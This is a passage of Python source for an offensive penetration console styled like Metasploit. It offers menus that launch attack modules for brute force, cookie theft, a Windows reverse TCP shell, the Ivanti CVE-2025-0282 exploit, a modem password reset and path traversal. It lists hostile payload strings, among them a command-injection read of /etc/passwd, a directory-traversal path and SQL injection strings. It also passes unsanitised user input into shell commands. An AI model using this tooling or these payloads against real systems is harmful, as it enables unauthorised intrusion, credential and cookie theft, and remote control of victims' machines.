    elif scconsole62 == "unuse":
        print("unusing multi/pop3-brute-force.")
        time.sleep(0.5)
        Console()
    elif scconsole62 == "exit":
        exit()

def aauxiliaryrobotstxt():
    scconsole63 = input("sc~" + color.red + "(auxiliary/robots_txt)" + color.white + ">")
    if scconsole63 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryrobotstxt()
    elif scconsole63 == "clear":
        os.system('clear')
        aauxiliaryrobotstxt()
    elif scconsole63 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryrobotstxt()
    elif scconsole63 == "run":
        os.system('python exploits/auxiliary/robots_txt.py')
        aauxiliaryrobotstxt()
    elif scconsole63 == "exploit":
        os.system('python exploits/auxiliary/robots_txt.py')
        aauxiliaryrobotstxt()
    elif scconsole63 == "unuse":
        print("unusing auxiliary/robots_txt.")
        time.sleep(0.5)
        Console()
    elif scconsole63 == "exit":
        exit()

def aauxiliarydirsbrute():
    scconsole64 = input("sc~" + color.red + "(auxiliary/dirs_brute)" + color.white + ">")
    if scconsole64 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarydirsbrute()
    elif scconsole64 == "clear":
        os.system('clear')
        aauxiliarydirsbrute()
    elif scconsole64 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
WORDLIST_PATH | specify the url-list path.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarydirsbrute()
    elif scconsole64 == "run":
        os.system('python exploits/auxiliary/dirs_brute.py')
        aauxiliarydirsbrute()
    elif scconsole64 == "exploit":
        os.system('python exploits/auxiliary/dirs_brute.py')
        aauxiliarydirsbrute()
    elif scconsole64 == "unuse":
        print("unusing auxiliary/dirs_brute.")
        time.sleep(0.5)
        Console()
    elif scconsole64 == "exit":
        exit()

def aauxiliaryhttpversion():
    scconsole65 = input("sc~" + color.red + "(auxiliary/http-version)" + color.white + ">")
    if scconsole65 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpversion()
    elif scconsole65 == "clear":
        os.system('clear')
        aauxiliaryhttpversion()
    elif scconsole65 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpversion()
    elif scconsole65 == "run":
        os.system('python exploits/auxiliary/http-version.py')
        aauxiliaryhttpversion()
    elif scconsole65 == "exploit":
        os.system('python exploits/auxiliary/http-version.py')
        aauxiliaryhttpversion()
    elif scconsole65 == "unuse":
        print("unusing auxiliary/http-version.")
        time.sleep(0.5)
        Console()
    elif scconsole65 == "exit":
        exit()

def aauxiliaryenumapacheuser():
    scconsole66 = input("sc~" + color.red + "(auxiliary/enum_apache_user)" + color.white + ">")
    if scconsole66 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryenumapacheuser()
    elif scconsole66 == "clear":
        os.system('clear')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAMELIST  | specify the username list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryenumapacheuser()
    elif scconsole66 == "run":
        os.system('python exploits/auxiliary/enum_apache_user.py')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "exploit":
        os.system('python exploits/auxiliary/enum_apache_user.py')
        aauxiliaryenumapacheuser()
    elif scconsole66 == "unuse":
        print("unusing auxiliary/enum_apache_user.")
        time.sleep(0.5)
        Console()
    elif scconsole66 == "exit":
        exit()

def aauxiliaryvulnscan():
    scconsole67 = input("sc~" + color.red + "(auxiliary/vuln-scan)" + color.white + ">")
    if scconsole67 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryvulnscan()
    elif scconsole67 == "clear":
        os.system('clear')
        aauxiliaryvulnscan()
    elif scconsole67 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryvulnscan()
    elif scconsole67 == "run":
        os.system('python exploits/auxiliary/vuln-scan.py')
        aauxiliaryvulnscan()
    elif scconsole67 == "exploit":
        os.system('python exploits/auxiliary/vuln-scan.py')
        aauxiliaryvulnscan()
    elif scconsole67 == "unuse":
        print("unusing auxiliary/vuln-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole67 == "exit":
        exit()

def aauxiliarysmtpversion():
    scconsole68 = input("sc~" + color.red + "(auxiliary/smtp-version)" + color.white + ">")
    if scconsole68 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarysmtpversion()
    elif scconsole68 == "clear":
        os.system('clear')
        aauxiliarysmtpversion()
    elif scconsole68 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysmtpversion()
    elif scconsole68 == "run":
        os.system('python exploits/auxiliary/smtp-version.py')
        aauxiliarysmtpversion()
    elif scconsole68 == "exploit":
        os.system('python exploits/auxiliary/smtp-version.py')
        aauxiliarysmtpversion()
    elif scconsole68 == "unuse":
        print("unusing auxiliary/smtp-version.")
        time.sleep(0.5)
        Console()
    elif scconsole68 == "exit":
        exit()

def wshellstorm():
    scconsole69 = input("sc~" + color.red + "(windows/shell-storm)" + color.white + ">")
    if scconsole69 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> to show the payloads can used in this exploit.
use <payload> ---> to use a payload.
""")
        wshellstorm()
    elif scconsole69 == "clear":
        os.system('clear')
        wshellstorm()
    elif scconsole69 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port.
LHOST         | specify your ip for listener.
LPORT         | specify port for listener.

you will specifiy these options when you run or exploit it!
""")
        wshellstorm()
    elif scconsole69 == "show payloads":
        print("""
""" + color.green + """shell_reverse_tcp""" + color.white + """ ---> trys to get a reverse shell from target.
""")
        wshellstorm()
    elif scconsole69 == "use shell_reverse_tcp":
        print("using shell_reverse_tcp")
        wshellstorm2()
    elif scconsole69 == "run":
        os.system('python exploits/windows/shell-storm.py')
        wshellstorm()
    elif scconsole69 == "exploit":
        os.system('python exploits/windows/shell-storm.py')
        wshellstorm()
    elif scconsole69 == "unuse":
        print("unusing windows/shell-storm.")
        time.sleep(0.5)
        Console()
    elif scconsole69 == "exit":
        exit()

def wshellstorm2():
    scconsole74 = input("sc~" + color.red + color.underline + "(windows/shell-storm)" + color.white + ">")
    if scconsole74 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wshellstorm2()
    elif scconsole74 == "clear":
        os.system('clear')
        wshellstorm2()
    elif scconsole74 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify the target ip address.
RPORT         | specify the target port.

PAYLOAD    ---> shell_reverse_tcp

you will specifiy these options when you run or exploit it!
""")
        wshellstorm2()
    elif scconsole74 == "run":
        os.system('python payloads/shell_reverse_tcp.py')
        wshellstorm2()
    elif scconsole74 == "exploit":
        os.system('python payloads/shell_reverse_tcp.py')
        wshellstorm2()
    elif scconsole74 == "unuse":
        print("unusing " + color.underline + "windows/shell-storm.")
        time.sleep(0.5)
        wshellstorm()
    elif scconsole74 == "exit":
        exit()

def aauxiliarytitle():
    scconsole70 = input("sc~" + color.red + "(auxiliary/title)" + color.white + ">")
    if scconsole70 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarytitle()
    elif scconsole70 == "clear":
        os.system('clear')
        aauxiliarytitle()
    elif scconsole70 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarytitle()
    elif scconsole70 == "run":
        os.system('python exploits/auxiliary/title.py')
        aauxiliarytitle()
    elif scconsole70 == "exploit":
        os.system('python exploits/auxiliary/title.py')
        aauxiliarytitle()
    elif scconsole70 == "unuse":
        print("unusing auxiliary/title.")
        time.sleep(0.5)
        Console()
    elif scconsole70 == "exit":
        exit()

def aauxiliarywordpressscan():
    scconsole71 = input("sc~" + color.red + "(auxiliary/wordpress-scan)" + color.white + ">")
    if scconsole71 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywordpressscan()
    elif scconsole71 == "clear":
        os.system('clear')
        aauxiliarywordpressscan()
    elif scconsole71 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywordpressscan()
    elif scconsole71 == "run":
        os.system('python exploits/auxiliary/wordpress-scan.py')
        aauxiliarywordpressscan()
    elif scconsole71 == "exploit":
        os.system('python exploits/auxiliary/wordpress-scan.py')
        aauxiliarywordpressscan()
    elif scconsole71 == "unuse":
        print("unusing auxiliary/wordpress-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole71 == "exit":
        exit()

def aauxiliarywordpressvuln():
    scconsole72 = input("sc~" + color.red + "(auxiliary/wordpress-vuln)" + color.white + ">")
    if scconsole72 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywordpressvuln()
    elif scconsole72 == "clear":
        os.system('clear')
        aauxiliarywordpressvuln()
    elif scconsole72 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywordpressvuln()
    elif scconsole72 == "run":
        os.system('python exploits/auxiliary/wordpress-vuln.py')
        aauxiliarywordpressvuln()
    elif scconsole72 == "exploit":
        os.system('python exploits/auxiliary/wordpress-vuln.py')
        aauxiliarywordpressvuln()
    elif scconsole72 == "unuse":
        print("unusing auxiliary/wordpress-vuln.")
        time.sleep(0.5)
        Console()
    elif scconsole72 == "exit":
        exit()

def aauxiliarydrupalscan():
    scconsole73 = input("sc~" + color.red + "(auxiliary/drupal-scan)" + color.white + ">")
    if scconsole73 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarydrupalscan()
    elif scconsole73 == "clear":
        os.system('clear')
        aauxiliarydrupalscan()
    elif scconsole73 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarydrupalscan()
    elif scconsole73 == "run":
        os.system('python exploits/auxiliary/drupal-scan.py')
        aauxiliarydrupalscan()
    elif scconsole73 == "exploit":
        os.system('python exploits/auxiliary/drupal-scan.py')
        aauxiliarydrupalscan()
    elif scconsole73 == "unuse":
        print("unusing auxiliary/drupal-scan.")
        time.sleep(0.5)
        Console()
    elif scconsole73 == "exit":
        exit()

def aauxiliarycookiestolen():
    scconsole75 = input("sc~" + color.red + "(auxiliary/cookie_stolen)" + color.white + ">")
    if scconsole75 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show RESULT ---> shows the result after scan.
""")
        aauxiliarycookiestolen()
    elif scconsole75 == "clear":
        os.system('clear')
        aauxiliarycookiestolen()
    elif scconsole75 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

RESULT        | results of stolen cookies will be saved into cookies.txt.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarycookiestolen()
    elif scconsole75 == "run":
        os.system('python exploits/auxiliary/cookie_stolen.py')
        aauxiliarycookiestolen()
    elif scconsole75 == "exploit":
        os.system('python exploits/auxiliary/cookie_stolen.py')
        aauxiliarycookiestolen()
    elif scconsole75 == "show RESULT":
        os.system('cat cookies.txt')
        aauxiliarycookiestolen()
    elif scconsole75 == "unuse":
        print("unusing auxiliary/cookie_stolen.")
        time.sleep(0.5)
        Console()
    elif scconsole75 == "exit":
        exit()

def tAurba501():
    scconsole76 = input("sc~" + color.red + "(site/Aurba-501)" + color.white + ">")
    if scconsole76 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tAurba501()
    elif scconsole76 == "clear":
        os.system('clear')
        tAurba501()
    elif scconsole76 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAME      | specify the username.
PASSWORD      | specify the password.

you will specifiy these options when you run or exploit it!
""")
        tAurba501()
    elif scconsole76 == "run":
        os.system('python exploits/site/Aurba-501.py')
        tAurba501()
    elif scconsole76 == "exploit":
        os.system('python exploits/site/Aurba-501.py')
        tAurba501()
    elif scconsole76 == "unuse":
        print("unusing site/Aurba-501.")
        time.sleep(0.5)
        Console()
    elif scconsole76 == "exit":
        exit()

def tHughesNetHT2000WSatelliteModem():
    scconsole77 = input("sc~" + color.red + "(site/HughesNet-HT2000W-Satellite-Modem)" + color.white + ">")
    if scconsole77 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "clear":
        os.system('clear')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
PASSWORD      | specify the password to reset.
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "run":
        passowrdforreset = input("Enter password for reset: ")
        taregturlforreset = input("Target URL: ")
        os.system(f'python exploits/site/HughesNet-HT2000W-Satellite-Modem.py {passowrdforreset} {taregturlforreset}')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "exploit":
        passowrdforreset2 = input("Enter password for reset: ")
        taregturlforreset2 = input("Target URL: ")
        os.system(f'python exploits/site/HughesNet-HT2000W-Satellite-Modem.py {passowrdforreset2} {taregturlforreset2}')
        tHughesNetHT2000WSatelliteModem()
    elif scconsole77 == "unuse":
        print("unusing site/HughesNet-HT2000W-Satellite-Modem.")
        time.sleep(0.5)
        Console()
    elif scconsole77 == "exit":
        exit()

def aauxiliarybasicauth():
    scconsole78 = input("sc~" + color.red + "(auxiliary/basic-auth)" + color.white + ">")
    if scconsole78 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarybasicauth()
    elif scconsole78 == "clear":
        os.system('clear')
        aauxiliarybasicauth()
    elif scconsole78 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
USERNAMELIST  | specify the username list.
PASSWORDLIST  | specify the password list.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarybasicauth()
    elif scconsole78 == "run":
        os.system('python exploits/auxiliary/basic-auth.py')
        aauxiliarybasicauth()
    elif scconsole78 == "exploit":
        os.system('python exploits/auxiliary/basic-auth.py')
        aauxiliarybasicauth()
    elif scconsole78 == "unuse":
        print("unusing auxiliary/basic-auth.")
        time.sleep(0.5)
        Console()
    elif scconsole78 == "exit":
        exit()

def aauxiliaryftpanonymous():
    scconsole79 = input("sc~" + color.red + "(auxiliary/ftp-anonymous)" + color.white + ">")
    if scconsole79 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryftpanonymous()
    elif scconsole79 == "clear":
        os.system('clear')
        aauxiliaryftpanonymous()
    elif scconsole79 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryftpanonymous()
    elif scconsole79 == "run":
        os.system('python exploits/auxiliary/ftp-anonymous.py')
        aauxiliaryftpanonymous()
    elif scconsole79 == "exploit":
        os.system('python exploits/auxiliary/ftp-anonymous.py')
        aauxiliaryftpanonymous()
    elif scconsole79 == "unuse":
        print("unusing auxiliary/ftp-anonymous.")
        time.sleep(0.5)
        Console()
    elif scconsole79 == "exit":
        exit()

def aauxiliaryhttpput():
    scconsole80 = input("sc~" + color.red + "(auxiliary/http_put)" + color.white + ">")
    if scconsole80 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliaryhttpput()
    elif scconsole80 == "clear":
        os.system('clear')
        aauxiliaryhttpput()
    elif scconsole80 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliaryhttpput()
    elif scconsole80 == "run":
        os.system('python exploits/auxiliary/http_put.py')
        aauxiliaryhttpput()
    elif scconsole80 == "exploit":
        os.system('python exploits/auxiliary/http_put.py')
        aauxiliaryhttpput()
    elif scconsole80 == "unuse":
        print("unusing auxiliary/http_put.")
        time.sleep(0.5)
        Console()
    elif scconsole80 == "exit":
        exit()

def aauxiliarypingmssql():
    scconsole81 = input("sc~" + color.red + "(auxiliary/ping-mssql)" + color.white + ">")
    if scconsole81 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarypingmssql()
    elif scconsole81 == "clear":
        os.system('clear')
        aauxiliarypingmssql()
    elif scconsole81 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarypingmssql()
    elif scconsole81 == "run":
        os.system('python exploits/auxiliary/ping-mssql.py')
        aauxiliarypingmssql()
    elif scconsole81 == "exploit":
        os.system('python exploits/auxiliary/ping-mssql.py')
        aauxiliarypingmssql()
    elif scconsole81 == "unuse":
        print("unusing auxiliary/ping-mssql.")
        time.sleep(0.5)
        Console()
    elif scconsole81 == "exit":
        exit()

def aauxiliarywebdavscanner():
    scconsole82 = input("sc~" + color.red + "(auxiliary/webdav_scanner)" + color.white + ">")
    if scconsole82 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        aauxiliarywebdavscanner()
    elif scconsole82 == "clear":
        os.system('clear')
        aauxiliarywebdavscanner()
    elif scconsole82 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarywebdavscanner()
    elif scconsole82 == "run":
        os.system('python exploits/auxiliary/webdav_scanner.py')
        aauxiliarywebdavscanner()
    elif scconsole82 == "exploit":
        os.system('python exploits/auxiliary/webdav_scanner.py')
        aauxiliarywebdavscanner()
    elif scconsole82 == "unuse":
        print("unusing auxiliary/webdav_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole82 == "exit":
        exit()

def aauxiliarysitemapgenerator():
    scconsole83 = input("sc~" + color.red + "(auxiliary/sitemap-generator)" + color.white + ">")
    if scconsole83 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show RESULT ---> show the result after scan.
""")
        aauxiliarysitemapgenerator()
    elif scconsole83 == "clear":
        os.system('clear')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

RESULT        | results of stolen sitemap will be saved into sitemap.xml.

you will specifiy these options when you run or exploit it!
""")
        aauxiliarysitemapgenerator()
    elif scconsole83 == "run":
        os.system('python exploits/auxiliary/sitemap-generator.py')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "exploit":
        os.system('python exploits/auxiliary/sitemap-generator.py')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "show RESULT":
        os.system('cat sitemap.xml')
        aauxiliarysitemapgenerator()
    elif scconsole83 == "unuse":
        print("unusing auxiliary/webdav_scanner.")
        time.sleep(0.5)
        Console()
    elif scconsole83 == "exit":
        exit()

def sservercve20250001():
    scconsole84 = input("sc~" + color.red + "(server/cve-2025-0001)" + color.white + ">")
    if scconsole84 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        sservercve20250001()
    elif scconsole84 == "clear":
        os.system('clear')
        sservercve20250001()
    elif scconsole84 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
PAYLOAD       | specify the payload.

you will specifiy these options when you run or exploit it!
""")
        sservercve20250001()
    elif scconsole84 == "show payloads":
        print("""
""" + color.green + """;cat /etc/passwd""" + color.white + """  ---> remote code execute cat payload.

""" + color.green + """../../../../etc/passwd""" + color.white + """  ---> directory traversal etc/passwd payload.
""")
        sservercve20250001()
    elif scconsole84 == "run":
        os.system('python exploits/server/cve-2025-0001.py')
        sservercve20250001()
    elif scconsole84 == "exploit":
        os.system('python exploits/server/cve-2025-0001.py')
        sservercve20250001()
    elif scconsole84 == "unuse":
        print("unusing server/cve-2025-0001.")
        time.sleep(0.5)
        Console()
    elif scconsole84 == "exit":
        exit()

def sservercve20250006():
    scconsole85 = input("sc~" + color.red + "(server/cve-2025-0006)" + color.white + ">")
    if scconsole85 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
show payloads ---> shows the payloads you can use in this exploit.
""")
        sservercve20250006()
    elif scconsole85 == "clear":
        os.system('clear')
        sservercve20250006()
    elif scconsole85 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.
PAYLOAD       | specify the payload.

you will specifiy these options when you run or exploit it!
""")
        sservercve20250006()
    elif scconsole85 == "show payloads":
        print("""
""" + color.green + """' OR 1=1--""" + color.white + """   ---> SQL Injection payload.

""" + color.green + """' UNION SELECT NULL,NULL,NULL--""" + color.white + """  ---> SQL Injection union payload.
""")
        sservercve20250006()
    elif scconsole85 == "run":
        os.system('python exploits/server/cve-2025-0006.py')
        sservercve20250006()
    elif scconsole85 == "exploit":
        os.system('python exploits/server/cve-2025-0006.py')
        sservercve20250006()
    elif scconsole85 == "unuse":
        print("unusing server/cve-2025-0006.")
        time.sleep(0.5)
        Console()
    elif scconsole85 == "exit":
        exit()

def wreversetcp():
    scconsole86 = input("sc~" + color.red + "(windows/reverse_tcp)" + color.white + ">")
    if scconsole86 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        wreversetcp()
    elif scconsole86 == "clear":
        os.system('clear')
        wreversetcp()
    elif scconsole86 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
LHOST         | specify listener host.
LPORT         | specify listener port.
RHOST         | specify target host.
RPORT         | specify target port.

you will specifiy these options when you run or exploit it!
""")
        wreversetcp()
    elif scconsole86 == "run":
        os.system('python exploits/windows/reverse_tcp.py')
        wreversetcp()
    elif scconsole86 == "exploit":
        os.system('python exploits/windows/reverse_tcp.py')
        wreversetcp()
    elif scconsole86 == "unuse":
        print("unusing windows/reverse_tcp.")
        time.sleep(0.5)
        Console()
    elif scconsole86 == "exit":
        exit()

def eexploitCVE20250282IvantiexploitCVE20250282Ivanti():
    scconsole87 = input("sc~" + color.red + "(exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti)" + color.white + ">")
    if scconsole87 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "clear":
        os.system('clear')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
RHOST         | specify target host.
LOCAL_SHELL   | specify the local shell path.

you will specifiy these options when you run or exploit it!
""")
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "run":
        targetwebip = input("TARGET_IP: ")
        localshellpath = input("LOCAL_SHELL_PATH: ")
        os.system(f'python exploits/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.py {targetwebip} {localshellpath}')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "exploit":
        targetwebip2 = input("TARGET_IP: ")
        localshellpath2 = input("LOCAL_SHELL_PATH: ")
        os.system(f'python exploits/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.py {targetwebip2} {localshellpath2}')
        eexploitCVE20250282IvantiexploitCVE20250282Ivanti()
    elif scconsole87 == "unuse":
        print("unusing exploit/CVE-2025-0282-Ivanti-exploit/CVE_2025_0282_Ivanti.")
        time.sleep(0.5)
        Console()
    elif scconsole87 == "exit":
        exit()

def tDevikav1PathTraversal():
    scconsole88 = input("sc~" + color.red + "(site/Devika-v1-Path-Traversal)" + color.white + ">")
    if scconsole88 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        tDevikav1PathTraversal()
    elif scconsole88 == "clear":
        os.system('clear')
        tDevikav1PathTraversal()
    elif scconsole88 == "show options":
        print("""
OPTIONS       | DISCREPTIONS
--------------|----------------------
URL           | specify the taregt url.

you will specifiy these options when you run or exploit it!
""")
        tDevikav1PathTraversal()
    elif scconsole88 == "run":
        targeturl2333 = input("URL (example: example.com): ")
        os.system(f'python exploits/site/Devika-v1-Path-Traversal.py -t {targeturl2333}')
        tDevikav1PathTraversal()
    elif scconsole88 == "exploit":
        targeturl2334 = input("URL (example: example.com): ")
        os.system(f'python exploits/site/Devika-v1-Path-Traversal.py -t {targeturl2334}')
        tDevikav1PathTraversal()
    elif scconsole88 == "unuse":
        print("unusing site/Devika-v1-Path-Traversal.")
        time.sleep(0.5)
        Console()
    elif scconsole88 == "exit":
        exit()

def sssniffersniffer():
    scconsole89 = input("sc~" + color.red + "(sniffer/sniffer)" + color.white + ">")
    if scconsole89 == "help":
        print("""
help ---> to see this help menu.
clear ---> to clear the screen.
unuse ---> to unuse this exploit.
exit ---> to exit from scconsole.
run ---> to run the exploit you selected.
exploit ---> to run the exploit you selected.
show options ---> to see the options.
""")
        sssniffersniffer()
    elif scconsole89 == "clear":
        os.system('clear')
        sssniffersniffer()
    elif scconsole89 == "show options":
        print("""
